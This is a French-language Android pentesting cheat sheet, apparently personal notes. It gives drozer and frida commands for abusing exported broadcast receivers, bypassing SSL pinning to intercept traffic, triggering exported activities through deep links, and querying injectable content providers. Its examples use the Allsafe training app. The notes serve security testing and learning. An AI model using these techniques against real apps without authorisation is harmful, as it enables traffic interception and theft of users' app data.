# Attaques sur Android

> Différentes attaques / configuration à vérifier dans une apk.



#### 1. Broadcast receiver

> Prérequis : le fichier `AndroidManifest.xml` contient un `<receiver>` avec comme permissions `android:exported=true`
>
> N'importe quelle application est en mesure d'intéragir avec ce receiver et de récupérer la réponse.
>
> ATTENTION : ne marche pas sur Android 26 (Oréo) et +
>
> Ressources : 
>
> - https://hackerone.com/reports/289000
> - https://hackerone.com/reports/97295
> - https://oldbam.github.io/android/security/android-vulnerabilities-insecurebank-broadcast-receivers
> - https://www.hackingarticles.in/android-penetration-testing-drozer/

- **Récupérer le nom du package de l'application  :**

```bash
dz> run app.package.list -f <NOM_APPLI>
```

- **Récupérer les broadcasts receivers / actions associées mal implémentés (exportables)  :**

```bash
dz> run app.broadcast.info -a <PACKAGE_DE_LAPPLI> -i
```

- **Lancer un broadcast pour trigger le broadcast receiver de l'application : **

```bash
# Les extras sont les paramètres que prennent les receivers
# On les obtient dans le code en analyse statique 
# Exemple : intent.getStringExtra("server");
dz> run app.broadcast.send --action <ACTION_BROADCAST_RECEIVER> --extra <TYPE> <NOM_EXTRA> <VALEUR_EXTRA>
```

* **Regarder le comportement dans l'application**



#### 2. Bypass SSL pinning

> Contournement de la protection appelée "**SSL pinning**".
>
> Dans les applications mobiles modernes, une protection contre le MITM est mise en place, c'est le **SSL pinning**. Le principe est simple : l'application est forcée de re-vérifier le certificat du serveur avec une liste de certificat embarquée (épinglée) dans cette dernière au moment du développement.
>
> Pour contrer cette protection, on utilise [frida](outils/frida.md).

**Sur le téléphone émulé : **

- Installer le serveur frida :

  ```bash
  # Télécharger le serveur
  $ wget https://github.com/frida/frida/releases/download/<version-number>/frida-server-<version-number>-android-x86.xz
  # On dézipe
  unxz frida-server-<version-number>-android-x86.xz
  mv frida-server-<version-number>-x86.xz frida-server
  # On met le binaire sur le téléphone
  $ adb push ~/Downloads/frida-server /data/local/tmp
  ```

- Lancer le serveur en background :

  ```bash
  $ adb shell /data/local/tmp/frida-server &
  ```

**Sur l'hôte :**

- Lancer le script `adbhelper.sh` (voir [configuration.md](configuration.md)) :

  ```bash
  # Sélectionner l'option 1
  $ ./adbhelper.sh
  1) Hook with Frida
  2) Pull an APK
  3) Quit
  [+] Please select a number from menu: 1
  # On met un mot clé (e.g. le nom de l'apk) pour trouver le package associé
  [+] Enter keyword of your app: apk
  1) package:com.awesomeproject
  [+] Please select the package number: 1
  # Et voilà, on peut récupérer le trafic de l'application dans un proxy BURP
  ```



### 3. Deep link

> Prérequis : le fichier `AndroidManifest.xml` contient un champ <data android:scheme=""...> 
>
> Deep link : Schémas URL custom (e.g. grab://, toutcequetuveux://, ...) définis dans le manifest qui indiquent à l'application que ces liens ouvrent directement dans cette dernière une activité
>
> Par défaut, chaque activité ayant un intent relié sont exportées et sont donc accessibles par n'importe quelle autre application du téléphone.
>
> Ressources : 
>
> - https://hackerone.com/reports/401793
> - https://hackerone.com/reports/583987
> - https://www.hackingarticles.in/android-pentest-deep-link-exploitation/

```xml
# Exemple :

<activity android:theme="@style/Theme.Allsafe.NoActionBar" android:name="infosecadventures.allsafe.challenges.DeepLinkTask">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="allsafe" android:host="infosecadventures" android:pathPrefix="/congrats" />
                
Ici, les URL qui commencent par allsafe://infosecadventures/congrats déclenchent l'activité infosecadventures.allsafe.challenges.DeepLinkTask de l'application.
```

* **Récupérer les activités exportées (voir les permissions requises) :**

```bash
dz> run app.activity.info -a <PACKAGE>
```

- **Récupérer les activités accessibles par navigateur :**

```bash
dz> run scanner.activity.browsable -a <PACKAGE>
```

- **Faire une requête avec le schéma URL custom défini dans le manifest :**

```bash
# Exemple
# dz> run app.activity.start --action android.intent.action.VIEW --data-uri allsafe://infosecadventures/congrats
dz> run app.activity.start --action android.intent.action.VIEW --data-uri <SCHEMA://HOST/PATHPREFIX>
```

* **On peut aussi créer une page HTML qu'on met sur le téléphone :**

```html
<!DOCTYPE html>
<html>
<a href="allsafe://infosecadventures/congrats">CSRF DEMO</a>
</html>
```



#### 4. SQLi

> Exploiter le scanner de drozer
>
> Un concept intéréssant à noter :
>
> - projection : quoi select
> - selection : condition du select
> - select <projection> where <selection>
>
> Ressources : 
>
> - https://www.hackingarticles.in/android-penetration-testing-drozer/
> - https://hackerone.com/reports/291764

* **Chercher une potentielle SQLi :**

```bash
dz> run scanner.provider.injection -a <PACKAGE>

# Exemple de réponse
# Injection in Projection:
#  content://infosecadventures.allsafe.dataprovider
```

- **Exploiter une SQLi :**

```bash
dz> run app.provider.query content://infosecadventures.allsafe.dataprovider --projection "*"
```

